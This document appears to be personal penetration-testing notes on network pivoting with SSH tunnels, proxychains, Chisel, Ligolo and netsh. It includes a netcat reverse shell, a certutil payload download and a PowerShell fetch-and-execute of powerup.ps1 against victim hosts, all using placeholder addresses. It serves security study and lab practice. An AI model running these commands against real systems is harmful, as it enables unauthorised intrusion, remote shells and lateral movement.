# Pivoting

## Personal Thought:
- Try running LinPEAS , WinPEAS and other tools via Pivoted tunnel w Proxychains.

## Pivoting using SSH

[Proxychains w/ SSH tutorial](https://www.youtube.com/watch?v=pdgBU9MDAwE&t=40650s)
### Dynamic Port Forwarding
- Here we use SSH dynamic port forwarding with proxychains to pivot into the internal network.
In the attacker box:
```
sudo vim /etc/proxychains4.conf
```
- Add **socks 127.0.0.1 9050** on the last line
```
ssh -D 9050 <username>@<external-ip>
```
- Here port 9050 is configured in the proxychains4.conf file.
```
proxychains nmap -sC -sV <internal-ip-range/ips>
proxychains <tool>
```

### Local Port Forwarding
- Inorder to access certain port on a victim machine through SSH tunneling we use the L flag, as follows:
```
ssh -L 1234:localhost:<victim-port> <victim>@<ip>
```

### Pivoting multimachines using SSH jump
- Inorder to access a subnet from a compromised host which has more than 1 interface, we can use SSH jump method inorder to access the inner subnet.
- Note inorder for this, we have to have SSH credentials of both the machines
```
ssh -J <victim1>@<victim1-ip> -D 127.0.0.1:9050 <victim2>@<victim2-ip>
```

## Pivoting using Chisel
[Tutorial #1 on chisel: Accessing victim#1's internal network](https://youtu.be/dIqoULXmhXg&t=682s)
Attacker:
```
sudo vim /etc/proxychains4.conf
socks5 127.0.0.1 1080
```
```
chisel server --port <port> --reverse -v
```

Victim:
```
chisel client <attacker-ip>:<attacker-port> R:socks
```

Attacker:
```
proxychains <tool>
proxychains nmap -sT -Pn -n --top-ports <victim-internal-ip> 
```


[Tutorial #2 on chisel: Accessing victim#2's port from the internal network by pivoting from victim#1](https://www.youtube.com/watch?v=B3GxYyGFYmQ&t=985s)

Attacker:
```
chisel server --port <port> --reverse -v
```
Victim #1:
```
# port forwards victim#2's port accessible by victim#1 to the attacker machine
chisel client <attacker-ip>:<attacker-port> R:<victim2-ip>:<victim2-port>
```
Attacker:
```
nmap -sC -sV -p<port> localhost
```

[Tutorial #3 on chisel w/ Netsh: Accessing victim#2's subnet by pivoting from victim#1](https://www.youtube.com/watch?v=B3GxYyGFYmQ&t=1588s)
This attack utilizes socks

Attacker:
```
sudo vim /etc/proxychains4.conf
socks5 127.0.0.1 1080
```
```
chisel server --port 8002 --reverse -v --socks5
```
Victim #1 host:
```
# Note this requires admin privileges or you can use chisel
netsh instance portproxy add v4tov4 listenport=8002 listenaddress=0.0.0.0 connectport=8002 connectaddress=<attacker-ip>
```
Victim #2 host:
```
chisel client <victim1-ip>:8002 R:socks
```
Attacker:
```
proxychains <tool>
proxychains nmap <victim2-internal-ip> -sT -sV
```


## Pivoting using Ligolo
[Setting Intial Proxy w/ Victim#1 using Ligolo](https://youtu.be/DM1B8S80EvQ)

Attacker:
```
# Initializing ligolo for the first time:
sudo ip tuntap add user <username> mode tun ligolo
sudo ip link set ligolo up
```
```
./proxy -selfcert
```

Victim:
```
.\ligolo-agent.exe -connect <attacker-ip>:<ligolo-port> -ignore-cert 
```

Attacker:
```
# In the ligolo interface:
session
```

```
# Adding pivot, in the attacker terminal (not ligolo interface):
sudo ip route add <victim-ip-range> dev ligolo
ip route list 
```

```
# Ligolo Interface:
session
start
```

```
# In attacker terminal:
<tool> <victim-internal-ip>
crackmapexec smb <internal-ip-range>
```

[Getting reverse shells using ligolo](https://youtu.be/DM1B8S80EvQ&t=570s)

Attacker:
```
# In attacker terminal:
rlwrap nc -nvlp <port>
```

```
# In ligolo interface:
listener_add --addr 0.0.0.0:<victim1-listening-port> --to 127.0.0.1:<attacker-listening-port>
listener_list
```


Victim #2:
```
nc.exe <victim1-ip> <victim1-listening-port> -e cmd.exe
```

[Transfering Files using ligolo](https://youtu.be/DM1B8S80EvQ&t=872s)

Attacker:
```
# In ligolo interface session victim#1:
listener_add --addr 0.0.0.0:<victim1-listening-port> --to 127.0.0.1:<attacker-serving-port>
listener_list
```
```
# In attacker terminal:
python3 -m http.server <attacker-serving-port>
```

Victim #2:
```
certutil -f -urlcache -split http://<victim#1-ip>:<victim-listening-port>/file.exe
```



## Transfering files using Netsh as pivot
[Pivoting Internal Machines Tutorial](https://www.youtube.com/watch?v=B3GxYyGFYmQ&t=1335s)

Attacker Box:
```
cp /opt/powerview/powerup.ps1 .
python3 -m http.server 8001
```
Victim #1 host:
```
# Note this requires admin privileges or you can use chisel
netsh instance portproxy add v4tov4 listenport=8001 listenaddress=0.0.0.0 connectport=8001 connectaddress=<attacker-ip>
```

Victim #2 host:
```
powershell -c 'IEX(New-Object Net.WebClient).downloadString('http://<victim1-ip>:8001/powerup.ps1')
```


